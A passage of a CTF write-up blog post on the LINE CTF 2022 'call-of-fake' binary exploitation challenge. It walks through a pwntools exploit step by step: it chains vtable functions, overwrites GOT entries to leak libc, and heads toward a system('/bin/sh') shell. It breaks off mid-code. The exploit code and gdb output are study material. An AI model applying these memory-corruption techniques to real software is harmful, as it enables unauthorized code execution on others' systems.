@@ -1,0 +1,527 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<meta name="HandheldFriendly" content="True">
+<meta name="MobileOptimized" content="320">
+<meta name="theme-color" content="#2ecc71">
+
+
+
+
+
+<title>LINE CTF 2022 - call-of-fake | kileak</title>
+
+
+
+
+
+<meta name="description" content="LINE CTF 2022 - call-of-fake">
+
+
+<meta name="keywords" content="line, calloffake">
+
+
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+
+
+
+
+
+
+<link rel="canonical" href="https://kileak.github.io/ctf/2022/linectf-calloffake/">
+<link rel="alternate" type="application/rss+xml" title="kileak" href="https://kileak.github.io/feed.xml" />
+
+
+
+<!-- Google tag (gtag.js) -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-4PGFKKP0QW"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'G-4PGFKKP0QW');
+</script>
+
+
+<script>base_url = "";</script>
+
+  </head>
+  <body class="">
+
+    <main class="main-container">
+
+        <header class="site-header">
+
+  <div class="container txt-center">
+    <a href="#" class="nav-toogle js-menu-trigger sliding-panel-button">
+      <span></span>
+      <span></span>
+      <span></span>
+    </a>
+
+    <nav class="js-menu sliding-panel-content">
+      <ul>
+        <li><a href="/">home</a></li>
+        <li><a href="https://www.youtube.com/channel/UCi-IXmtQLrJjg5Ji78DqvAg/videos" target="_blank">youtube</a></li>
+        <li><a href="/feed.xml" target="_blank"><i class="icon icon-feed"></i> feed</a></li>
+      </ul>
+    </nav>
+    <div class="js-menu-screen sliding-panel-fade-screen"></div>
+
+    <a href="/" class="author-thumb dot">
+      <img src="/images/author.jpg" alt="Author thumbnail" class="dot">
+    </a>
+
+    <!--
+    <a href="https://www.youtube.com/channel/UCi-IXmtQLrJjg5Ji78DqvAg/videos" target="_blank" class="youtube-thumb dot">
+      <img src="/images/youtube-icon.png" alt="Youtube" class "dot">
+    </a>
+    -->
+
+    
+      <h1 class="post-title">LINE CTF 2022 - call-of-fake</h1>
+      <p class="post-meta">Mar 27, 2022</p>
+    
+
+  </div>
+
+</header>
+
+
+        <section class="main-content">
+          <article class="post">
+
+  <div class="post-content container">
+    <blockquote>
+  <p>LINE CTF 2022 - call-of-fake
+<!--break--></p>
+
+  <p>Call Call Call!?</p>
+
+  <p>nc 34.146.170.115 10001</p>
+
+  <p>Environment: Ubuntu20.04 dcfba5b03622f31b1d0673c3f5f14181012b46199abca3ba4af6c1433f03ffd9 /lib/x86_64-linux-gnu/libc-2.31.so</p>
+
+  <p>Attachment: <a href="https://kileak.github.io/assets/line22/calloffake/call-of-fake.tar.gz">call-of-fake.tar.gz</a> <a href="https://kileak.github.io/assets/line22/calloffake/xpl.py">xpl.py</a></p>
+
+  <p>Team: Super HexaGoN</p>
+</blockquote>
+
+<figure class="highlight"><pre><code class="language-text" data-lang="text">Make call of fake!
+str: 1
+1
+
+str: 2
+2
+
+...
+
+str: 8
+8
+
+str: 9
+9
+
+heap buffer overflow primitive: aaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
+Segmentation fault (core dumped)</code></pre></figure>
+
+<p>Taking a short glance at the decompiled source of the challenge, I quickly decided that I don’t want to reverse it and just went on with a dynamic approach, which worked out pretty well.</p>
+
+<p>Let’s just see, what crashes the binary.</p>
+
+<figure class="highlight"><pre><code class="language-python" data-lang="python"><span class="c1">#!/usr/bin/python
+</span><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+<span class="kn">import</span> <span class="nn">sys</span>
+
+<span class="n">LOCAL</span> <span class="o">=</span> <span class="bp">True</span>
+
+<span class="n">HOST</span> <span class="o">=</span> <span class="s">"34.146.170.115"</span>
+<span class="n">PORT</span> <span class="o">=</span> <span class="mi">10001</span>
+<span class="n">PROCESS</span> <span class="o">=</span> <span class="s">"./call-of-fake"</span>
+
+
+<span class="k">def</span> <span class="nf">exploit</span><span class="p">(</span><span class="n">r</span><span class="p">):</span>
+    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">9</span><span class="p">):</span>
+        <span class="n">r</span><span class="p">.</span><span class="n">sendafter</span><span class="p">(</span><span class="s">"str: "</span><span class="p">,</span> <span class="s">"A"</span><span class="o">*</span><span class="mh">0x20</span><span class="p">)</span>
+
+    <span class="n">r</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">": "</span><span class="p">,</span> <span class="n">cyclic_metasploit</span><span class="p">(</span><span class="mh">0x400</span><span class="p">))</span>
+
+    <span class="n">r</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span>
+
+    <span class="k">return</span>
+
+
+<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="s">"__main__"</span><span class="p">:</span>
+    <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">)</span> <span class="o">&gt;</span> <span class="mi">1</span><span class="p">:</span>
+        <span class="n">LOCAL</span> <span class="o">=</span> <span class="bp">False</span>
+        <span class="n">r</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="n">HOST</span><span class="p">,</span> <span class="n">PORT</span><span class="p">)</span>
+    <span class="k">else</span><span class="p">:</span>
+        <span class="n">LOCAL</span> <span class="o">=</span> <span class="bp">True</span>
+        <span class="n">r</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s">"./call-of-fake"</span><span class="p">)</span>
+        <span class="k">print</span><span class="p">(</span><span class="n">util</span><span class="p">.</span><span class="n">proc</span><span class="p">.</span><span class="n">pidof</span><span class="p">(</span><span class="n">r</span><span class="p">))</span>
+        <span class="n">pause</span><span class="p">()</span>
+
+    <span class="n">exploit</span><span class="p">(</span><span class="n">r</span><span class="p">)</span></code></pre></figure>
+
+<figure class="highlight"><pre><code class="language-text" data-lang="text">Program received signal SIGSEGV, Segmentation fault.
+0x0000000000402d36 in objectManager::~objectManager() ()
+──────────────────────────────────────────────────────────────────────── registers ──────
+$rax   : 0x6141316141306141 ("Aa0Aa1Aa"?)
+$rbx   : 0x00007fffffffddc0  →  0x000000000000000c ("
+                                                     "?)
+$rcx   : 0x0000000000402658  →  &lt;objectString::get()+0&gt; endbr64 
+$rdx   : 0x00000000004014f8  →  &lt;Object1::fire()+0&gt; endbr64 
+$rsp   : 0x00007fffffffdd60  →  0x00000000004014f8  →  &lt;Object1::fire()+0&gt; endbr64 
+$rbp   : 0x00007fffffffde50  →  0x00007fffffffde70  →  0x00007fffffffe300  →  0x0000000000000000
+$rsi   : 0xb               
+$rdi   : 0x0000000000419eb8  →  0x000000000041a000  →  0x00000000004014f8  →  &lt;Object1::fire()+0&gt; endbr64 
+$rip   : 0x0000000000402d36  →  &lt;objectManager::~objectManager()+448&gt; mov rax, QWORD PTR [rax]
+$r8    : 0xfffffffffffffff0
+$r9    : 0x20              
+$r10   : 0x000000000041a490  →  "AAAAAAAAAAAAAAAA"
+$r11   : 0x000000000041a090  →  "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab[...]"
+$r12   : 0xc               
+$r13   : 0x0               
+$r14   : 0xc               
+$r15   : 0x0               
+$eflags: [zero carry PARITY adjust sign trap INTERRUPT direction overflow RESUME virtualx86 identification]
+$cs: 0x0033 $ss: 0x002b $ds: 0x0000 $es: 0x0000 $fs: 0x0000 $gs: 0x0000 
+────────────────────────────────────────────────────────────────────────────── code:x86:64 ────
+     0x402d2a &lt;objectManager::~objectManager()+436&gt; mov    rdx, QWORD PTR [rbp-0x70]
+     0x402d2e &lt;objectManager::~objectManager()+440&gt; mov    rdx, QWORD PTR [rax+rdx*8]
+     0x402d32 &lt;objectManager::~objectManager()+444&gt; mov    rax, QWORD PTR [rbp-0x40]
+ →   0x402d36 &lt;objectManager::~objectManager()+448&gt; mov    rax, QWORD PTR [rax]
+     0x402d39 &lt;objectManager::~objectManager()+451&gt; cmp    rdx, rax
+     0x402d3c &lt;objectManager::~objectManager()+454&gt; jne    0x402d44 &lt;_ZN13objectManagerD2Ev+462&gt;
+     0x402d3e &lt;objectManager::~objectManager()+456&gt; mov    BYTE PTR [rbp-0x71], 0x1
+     0x402d42 &lt;objectManager::~objectManager()+460&gt; jmp    0x402d4b &lt;_ZN13objectManagerD2Ev+469&gt;
+     0x402d44 &lt;objectManager::~objectManager()+462&gt; add    QWORD PTR [rbp-0x70], 0x1
+───────────────────────────────────────────────────────────────────────────────────── stack ────
+0x00007fffffffdd60│+0x0000: 0x00000000004014f8  →  &lt;Object1::fire()+0&gt; endbr64 	 ← $rsp
+0x00007fffffffdd68│+0x0008: 0x00000000004017e8  →  &lt;Object1::getNameBuffer()+0&gt; endbr64 
+0x00007fffffffdd70│+0x0010: 0x0000000000401540  →  &lt;Object1::setName(void*,+0&gt; endbr64 
+0x00007fffffffdd78│+0x0018: 0x0000000000401a4e  →  &lt;Object1::getTag()+0&gt; endbr64 
+0x00007fffffffdd80│+0x0020: 0x0000000000401b02  →  &lt;Object1::getName()+0&gt; endbr64 
+0x00007fffffffdd88│+0x0028: 0x0000000000401a64  →  &lt;Object1::setTag(unsigned+0&gt; endbr64 </code></pre></figure>
+
+<p>Seems it’s calling a dtor on <code class="language-plaintext highlighter-rouge">objectManager</code> and tries to dereference a part of our payload, probably some kind of exit funcs.</p>
+
+<p>Let’s give it a proper address, so that dereferencing it won’t crash it.</p>
+
+<figure class="highlight"><pre><code class="language-python" data-lang="python"><span class="n">payload</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x407200</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">cyclic_metasploit</span><span class="p">(</span><span class="mh">0x400</span><span class="p">)</span>
+
+<span class="n">r</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">": "</span><span class="p">,</span> <span class="n">payload</span><span class="p">)</span></code></pre></figure>
+
+<p>Now, we can see, that the binary will compare the value at the given address with a predefined set of functions and if it’s in that list, it will execute it.</p>
+
+<figure class="highlight"><pre><code class="language-text" data-lang="text">     0x402d2a &lt;objectManager::~objectManager()+436&gt; mov    rdx, QWORD PTR [rbp-0x70]
+●→   0x402d2e &lt;objectManager::~objectManager()+440&gt; mov    rdx, QWORD PTR [rax+rdx*8]
+     0x402d32 &lt;objectManager::~objectManager()+444&gt; mov    rax, QWORD PTR [rbp-0x40]
+     0x402d36 &lt;objectManager::~objectManager()+448&gt; mov    rax, QWORD PTR [rax]
+     0x402d39 &lt;objectManager::~objectManager()+451&gt; cmp    rdx, rax
+     0x402d3c &lt;objectManager::~objectManager()+454&gt; jne    0x402d44 &lt;_ZN13objectManagerD2Ev+462&gt;
+
+...
+
+gef➤  telescope $rax
+0x00007fffffffdd60│+0x0000: 0x00000000004014f8  →  &lt;Object1::fire()+0&gt; endbr64 	 ← $rax, $rsp
+0x00007fffffffdd68│+0x0008: 0x00000000004017e8  →  &lt;Object1::getNameBuffer()+0&gt; endbr64 
+0x00007fffffffdd70│+0x0010: 0x0000000000401540  →  &lt;Object1::setName(void*,+0&gt; endbr64 
+0x00007fffffffdd78│+0x0018: 0x0000000000401a4e  →  &lt;Object1::getTag()+0&gt; endbr64 
+0x00007fffffffdd80│+0x0020: 0x0000000000401b02  →  &lt;Object1::getName()+0&gt; endbr64 
+0x00007fffffffdd88│+0x0028: 0x0000000000401a64  →  &lt;Object1::setTag(unsigned+0&gt; endbr64 
+0x00007fffffffdd90│+0x0030: 0x0000000000401a84  →  &lt;Object1::addTag(unsigned+0&gt; endbr64 
+0x00007fffffffdd98│+0x0038: 0x0000000000401ad8  →  &lt;Object1::addTwiceTag()+0&gt; endbr64 
+0x00007fffffffdda0│+0x0040: 0x0000000000402b20  →  &lt;objectManager::addStorage(unsigned+0&gt; endbr64 
+0x00007fffffffdda8│+0x0048: 0x00000000004025b4  →  &lt;objectString::set(char*)+0&gt; endbr64 
+0x00007fffffffddb0│+0x0050: 0x00000000004025ea  →  &lt;objectString::alloc(char*,+0&gt; endbr64 
+0x00007fffffffddb8│+0x0058: 0x0000000000402658  →  &lt;objectString::get()+0&gt; endbr64 </code></pre></figure>
+
+<p>So, by giving references to pointers to those functions, we can chain multiple calls of them (which will have our payload as input object).</p>
+
+<figure class="highlight"><pre><code class="language-python" data-lang="python"><span class="k">def</span> <span class="nf">ref</span><span class="p">(</span><span class="n">v</span><span class="p">):</span>
+    <span class="k">return</span> <span class="nb">next</span><span class="p">(</span><span class="n">e</span><span class="p">.</span><span class="n">search</span><span class="p">(</span><span class="n">p64</span><span class="p">(</span><span class="n">v</span><span class="p">)))</span>
+
+<span class="k">def</span> <span class="nf">exploit</span><span class="p">(</span><span class="n">r</span><span class="p">):</span>
+    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">9</span><span class="p">):</span>
+        <span class="n">r</span><span class="p">.</span><span class="n">sendafter</span><span class="p">(</span><span class="s">"str: "</span><span class="p">,</span> <span class="s">"A"</span><span class="o">*</span><span class="mh">0x20</span><span class="p">)</span>
+
+    <span class="n">FIRE</span> <span class="o">=</span> <span class="n">ref</span><span class="p">(</span><span class="mh">0x00000000004014f8</span><span class="p">)</span>
+    <span class="n">GETNAMEBUFFER</span> <span class="o">=</span> <span class="n">ref</span><span class="p">(</span><span class="mh">0x00000000004017e8</span><span class="p">)</span>
+    <span class="n">SETNAME</span> <span class="o">=</span> <span class="n">ref</span><span class="p">(</span><span class="mh">0x0000000000401540</span><span class="p">)</span>
+    <span class="n">GETTAG</span> <span class="o">=</span> <span class="n">ref</span><span class="p">(</span><span class="mh">0x0000000000401a4e</span><span class="p">)</span>
+    <span class="n">GETNAME</span> <span class="o">=</span> <span class="n">ref</span><span class="p">(</span><span class="mh">0x0000000000401b02</span><span class="p">)</span>
+    <span class="n">SETTAG</span> <span class="o">=</span> <span class="n">ref</span><span class="p">(</span><span class="mh">0x0000000000401a64</span><span class="p">)</span>
+    <span class="n">ADDTWICETAG</span> <span class="o">=</span> <span class="n">ref</span><span class="p">(</span><span class="mh">0x0000000000401ad8</span><span class="p">)</span>
+    <span class="n">ADDSTORAGE</span> <span class="o">=</span> <span class="n">ref</span><span class="p">(</span><span class="mh">0x0000000000402b20</span><span class="p">)</span>
+    <span class="n">SET</span> <span class="o">=</span> <span class="n">ref</span><span class="p">(</span><span class="mh">0x00000000004025b4</span><span class="p">)</span>
+    <span class="n">ALLOC</span> <span class="o">=</span> <span class="n">ref</span><span class="p">(</span><span class="mh">0x00000000004025ea</span><span class="p">)</span>
+    <span class="n">GET</span> <span class="o">=</span> <span class="n">ref</span><span class="p">(</span><span class="mh">0x0000000000402658</span><span class="p">)</span></code></pre></figure>
+
+<p>This narrows the interesting code to look at a bit down.</p>
+
+<figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="kt">void</span><span class="o">*</span> <span class="n">objectString</span><span class="o">::</span><span class="n">set</span><span class="p">(</span><span class="n">objectString</span> <span class="o">*</span><span class="n">this</span><span class="p">,</span> <span class="kt">char</span> <span class="o">*</span><span class="n">arg</span><span class="p">)</span>
+<span class="p">{</span>
+  <span class="k">return</span> <span class="n">memcpy</span><span class="p">(</span><span class="o">*</span><span class="p">(</span><span class="n">this</span> <span class="o">+</span> <span class="mi">1</span><span class="p">),</span> <span class="n">arg</span><span class="p">,</span> <span class="o">*</span><span class="p">(</span><span class="n">this</span> <span class="o">+</span> <span class="mi">2</span><span class="p">));</span>
+<span class="p">}</span></code></pre></figure>
+
+<p>This looks already interesting, since <code class="language-plaintext highlighter-rouge">this</code> will point to our payload, we would control <code class="language-plaintext highlighter-rouge">rdi</code> and <code class="language-plaintext highlighter-rouge">rdx</code> argument for <code class="language-plaintext highlighter-rouge">memcpy</code>, but <code class="language-plaintext highlighter-rouge">arg</code> would always be <code class="language-plaintext highlighter-rouge">0xb</code> leading to a crash, when trying to execute <code class="language-plaintext highlighter-rouge">memcpy</code>.</p>
+
+<figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="kt">long</span> <span class="n">Object1</span><span class="o">::</span><span class="n">addTwiceTag</span><span class="p">(</span><span class="n">Object1</span> <span class="o">*</span><span class="n">this</span><span class="p">)</span>
+<span class="p">{</span>
+  <span class="k">return</span> <span class="n">Object1</span><span class="o">::</span><span class="n">addTag</span><span class="p">(</span><span class="n">this</span><span class="p">,</span> <span class="o">*</span><span class="p">(</span><span class="n">this</span> <span class="o">+</span> <span class="mi">1</span><span class="p">));</span>
+<span class="p">}</span></code></pre></figure>
+
+<p>Though we’re not really interested in calling <code class="language-plaintext highlighter-rouge">addTag</code>, <code class="language-plaintext highlighter-rouge">addTwiceTag</code> has the side-effect of setting <code class="language-plaintext highlighter-rouge">rsi</code> to <code class="language-plaintext highlighter-rouge">this+1</code>, giving us control over <code class="language-plaintext highlighter-rouge">rsi</code> itself.</p>
+
+<p>We can now chain <code class="language-plaintext highlighter-rouge">addTwiceTag</code> to set <code class="language-plaintext highlighter-rouge">rsi</code> and then call <code class="language-plaintext highlighter-rouge">set</code> to execute a <code class="language-plaintext highlighter-rouge">memcpy</code> with all arguments controlled. But for now, we can only copy existing stuff from a known address to another known address.</p>
+
+<p>Let’s turn this into a more useful primitive, by overwriting <code class="language-plaintext highlighter-rouge">memcpy.got</code> itself with this to <code class="language-plaintext highlighter-rouge">read.got</code> (for which we then would also control all arguments the same way)</p>
+
+<figure class="highlight"><pre><code class="language-python" data-lang="python"><span class="c1"># rsi = e.got["read"]
+</span><span class="n">payload</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="n">ADDTWICETAG</span><span class="p">)</span>        <span class="c1"># call addTwiceTag
+</span><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">e</span><span class="p">.</span><span class="n">got</span><span class="p">[</span><span class="s">"read"</span><span class="p">])</span>     <span class="c1"># rsi
+</span><span class="n">payload</span> <span class="o">+=</span> <span class="s">"A"</span><span class="o">*</span><span class="p">(</span><span class="mh">0x40</span><span class="o">-</span><span class="nb">len</span><span class="p">(</span><span class="n">payload</span><span class="p">))</span>
+    
+<span class="c1"># memcpy(e.got["memcpy"], e.got["read"], 8)
+</span><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">SET</span><span class="p">)</span>               <span class="c1"># call set
+</span><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">e</span><span class="p">.</span><span class="n">got</span><span class="p">[</span><span class="s">"memcpy"</span><span class="p">])</span>   <span class="c1"># rdi
+</span><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">8</span><span class="p">)</span>                 <span class="c1"># rdx</span></code></pre></figure>
+
+<p>After this, <code class="language-plaintext highlighter-rouge">memcpy.got</code> will point to <code class="language-plaintext highlighter-rouge">read</code></p>
+
+<figure class="highlight"><pre><code class="language-text" data-lang="text">gef➤  x/gx 0x407098
+0x407098 &lt;read@got.plt&gt;:	0x00007ffff7cdbff0
+gef➤  x/gx 0x407050
+0x407050 &lt;memcpy@got.plt&gt;:	0x00007ffff7cdbff0
+gef➤  x/i 0x00007ffff7cdbff0
+   0x7ffff7cdbff0 &lt;__GI___libc_read&gt;:	endbr64 </code></pre></figure>
+
+<p>We can now do the same again, but this time, it will call <code class="language-plaintext highlighter-rouge">read(rdi,rsi,rdx)</code> instead, giving us the possibility to write arbitrary data somewhere.</p>
+
+<p>Let’s take a look at <code class="language-plaintext highlighter-rouge">fire</code> to get an idea, how we could turn <code class="language-plaintext highlighter-rouge">free</code> into a leak.</p>
+
+<figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="kt">void</span> <span class="n">Object1</span><span class="o">::</span><span class="n">fire</span><span class="p">(</span><span class="n">Object1</span> <span class="o">*</span><span class="n">this</span><span class="p">)</span>
+<span class="p">{</span>
+  <span class="o">*</span><span class="p">(</span><span class="n">this</span> <span class="o">+</span> <span class="mi">1</span><span class="p">)</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+
+  <span class="n">obj_string</span> <span class="o">=</span> <span class="o">*</span><span class="p">(</span><span class="n">this</span> <span class="o">+</span> <span class="mi">4</span><span class="p">);</span>
+
+  <span class="k">if</span> <span class="p">(</span> <span class="n">obj_string</span> <span class="p">)</span>
+  <span class="p">{</span>
+    <span class="n">objectString</span><span class="o">::~</span><span class="n">objectString</span><span class="p">(</span><span class="o">*</span><span class="p">(</span><span class="n">this</span> <span class="o">+</span> <span class="mi">4</span><span class="p">));</span>
+    <span class="n">operator</span> <span class="n">delete</span><span class="p">(</span><span class="n">obj_string</span><span class="p">,</span> <span class="mh">0x18</span><span class="p">);</span>
+  <span class="p">}</span>
+<span class="p">}</span>
+
+<span class="kt">void</span> <span class="n">objectString</span><span class="o">::~</span><span class="n">objectString</span><span class="p">(</span><span class="n">objectString</span> <span class="o">*</span><span class="n">this</span><span class="p">)</span>
+<span class="p">{</span>
+  <span class="o">*</span><span class="n">this</span> <span class="o">=</span> <span class="o">&amp;</span><span class="n">off_406D68</span><span class="p">;</span>
+
+  <span class="n">free</span><span class="p">(</span><span class="o">*</span><span class="p">(</span><span class="n">this</span> <span class="o">+</span> <span class="mi">1</span><span class="p">));</span>
+
+  <span class="o">*</span><span class="p">(</span><span class="n">this</span> <span class="o">+</span> <span class="mi">2</span><span class="p">)</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+<span class="p">}</span></code></pre></figure>
+
+<p><code class="language-plaintext highlighter-rouge">fire</code> would call <code class="language-plaintext highlighter-rouge">~objectString</code>, which then will call <code class="language-plaintext highlighter-rouge">free</code> on the second argument in our payload. Since we still have no leak, I used the <code class="language-plaintext highlighter-rouge">memcpy-read</code> to overwrite <code class="language-plaintext highlighter-rouge">free.got</code> with <code class="language-plaintext highlighter-rouge">puts</code>, so we can leak some data by freeing it.</p>
+
+<figure class="highlight"><pre><code class="language-python" data-lang="python"><span class="c1"># rsi = e.got["free"]
+</span><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">ADDTWICETAG</span><span class="p">)</span>				   <span class="c1"># call addTwiceTag
+</span><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">e</span><span class="p">.</span><span class="n">got</span><span class="p">[</span><span class="s">"free"</span><span class="p">])</span>			   <span class="c1"># rsi
+</span><span class="n">payload</span> <span class="o">+=</span> <span class="s">"C"</span><span class="o">*</span><span class="p">(</span><span class="mh">0xe0</span><span class="o">-</span><span class="nb">len</span><span class="p">(</span><span class="n">payload</span><span class="p">))</span>
+
+<span class="c1"># read(0, e.got["free"], 0x20)
+</span><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">SET</span><span class="p">)</span>                  <span class="c1"># call set
+</span><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>                    <span class="c1"># rdi
+</span><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x20</span><span class="p">)</span>                 <span class="c1"># rdx
+</span><span class="n">payload</span> <span class="o">+=</span> <span class="s">"F"</span><span class="o">*</span><span class="p">(</span><span class="mh">0x140</span><span class="o">-</span><span class="nb">len</span><span class="p">(</span><span class="n">payload</span><span class="p">))</span>
+
+<span class="c1"># free(e.got["free"]+0x10) =&gt; puts(e.got["free"]+0x10)
+</span><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">FIRE</span><span class="p">)</span>    
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">e</span><span class="p">.</span><span class="n">got</span><span class="p">[</span><span class="s">"free"</span><span class="p">]</span><span class="o">+</span><span class="mh">0x10</span><span class="p">)</span>   <span class="c1"># object string ptr
+</span><span class="n">payload</span> <span class="o">+=</span> <span class="s">"F"</span><span class="o">*</span><span class="p">(</span><span class="mh">0x160</span><span class="o">-</span><span class="nb">len</span><span class="p">(</span><span class="n">payload</span><span class="p">))</span>
+
+<span class="p">...</span>
+
+<span class="c1"># send payload for read(0, e.got["free], 0x20)
+</span><span class="n">payload2</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x0000000000401150</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x21</span><span class="p">)</span>
+<span class="n">payload2</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">e</span><span class="p">.</span><span class="n">got</span><span class="p">[</span><span class="s">"setvbuf"</span><span class="p">])</span>
+<span class="n">r</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="n">payload2</span><span class="p">)</span></code></pre></figure>
+
+<p>That turned out to get a bit tricky and in hindsight it might have been better to search for some other controllable <code class="language-plaintext highlighter-rouge">got</code> than free, since after the dtor of <code class="language-plaintext highlighter-rouge">objectString</code> it will also call <code class="language-plaintext highlighter-rouge">delete</code> on the object, which will ultimately call <code class="language-plaintext highlighter-rouge">free</code>, so we have to make sure, that we serve it a valid chunk, that can be freed.</p>
+
+<p>The payload will first set <code class="language-plaintext highlighter-rouge">rsi</code> accordingly and then call <code class="language-plaintext highlighter-rouge">read(0, e.got["free"], 0x20)</code> via the <code class="language-plaintext highlighter-rouge">set</code> function. We’ll send a second payload then, which will for one overwrite <code class="language-plaintext highlighter-rouge">e.got["free]</code> with <code class="language-plaintext highlighter-rouge">e.plt["puts]</code> and put a <code class="language-plaintext highlighter-rouge">0x20</code> fake chunk behind it, with its content pointing to <code class="language-plaintext highlighter-rouge">e.got["setvbuf]</code>.</p>
+
+<p>When we now trigger <code class="language-plaintext highlighter-rouge">Fire</code>, this will call <code class="language-plaintext highlighter-rouge">~objectString(e.got["free]+0x10)</code>, which will then call <code class="language-plaintext highlighter-rouge">free([e.got["free"]+0x10+0x8])</code>, which now boils down to <code class="language-plaintext highlighter-rouge">puts(e.got["setvbuf"])</code> giving us our libc leak finally.</p>
+
+<p>After the leak it will try to <code class="language-plaintext highlighter-rouge">delete</code> the chunk, which will be done nicely, since we also put a fake <code class="language-plaintext highlighter-rouge">0x21</code> size in that fake object allowing us to continue our call chain.</p>
+
+<figure class="highlight"><pre><code class="language-python" data-lang="python"><span class="c1"># read the output of ~objectString leak
+</span><span class="n">LEAK</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">r</span><span class="p">.</span><span class="n">recvline</span><span class="p">()[:</span><span class="o">-</span><span class="mi">1</span><span class="p">].</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="s">"</span><span class="se">\x00</span><span class="s">"</span><span class="p">))</span>
+<span class="n">libc</span><span class="p">.</span><span class="n">address</span> <span class="o">=</span> <span class="n">LEAK</span> <span class="o">-</span> <span class="n">libc</span><span class="p">.</span><span class="n">symbols</span><span class="p">[</span><span class="s">"setvbuf"</span><span class="p">]</span>
+
+<span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"LEAK     : %s"</span> <span class="o">%</span> <span class="nb">hex</span><span class="p">(</span><span class="n">LEAK</span><span class="p">))</span>
+<span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"LIBC     : %s"</span> <span class="o">%</span> <span class="nb">hex</span><span class="p">(</span><span class="n">libc</span><span class="p">.</span><span class="n">address</span><span class="p">))</span></code></pre></figure>
+
+<figure class="highlight"><pre><code class="language-text" data-lang="text">$ python work.py 1
+[*] '/media/sf_ctf/line22/calloffake/call-of-fake'
+    Arch:     amd64-64-little
+    RELRO:    Partial RELRO
+    Stack:    Canary found
+    NX:       NX enabled
+    PIE:      No PIE (0x400000)
+[*] '/media/sf_ctf/line22/calloffake/libc.so.6'
+    Arch:     amd64-64-little
+    RELRO:    Partial RELRO
+    Stack:    Canary found
+    NX:       NX enabled
+    PIE:      PIE enabled
+[+] Opening connection to 34.146.170.115 on port 10001: Done
+[*] Paused (press any to continue)
+[*] LEAK     : 0x7fea5a4ebd10
+[*] LIBC     : 0x7fea5a467000
+[*] Switching to interactive mode
+[*] Got EOF while reading in interactive</code></pre></figure>
+
+<p>Looking good and with the leak not crashing in <code class="language-plaintext highlighter-rouge">free</code> we got the hardest part done.</p>
+
+<p>We can now use our <code class="language-plaintext highlighter-rouge">read</code> primitive again, to overwrite <code class="language-plaintext highlighter-rouge">free</code> again, but this time with <code class="language-plaintext highlighter-rouge">system</code> and pass it another chunk, which will point to <code class="language-plaintext highlighter-rouge">/bin/sh</code>. Calling <code class="language-plaintext highlighter-rouge">Fire</code> again should then result in a <code class="language-plaintext highlighter-rouge">system("/bin/sh")</code> call.</p>
+
+<figure class="highlight"><pre><code class="language-python" data-lang="python"><span class="c1"># rsi = e.got["free"]
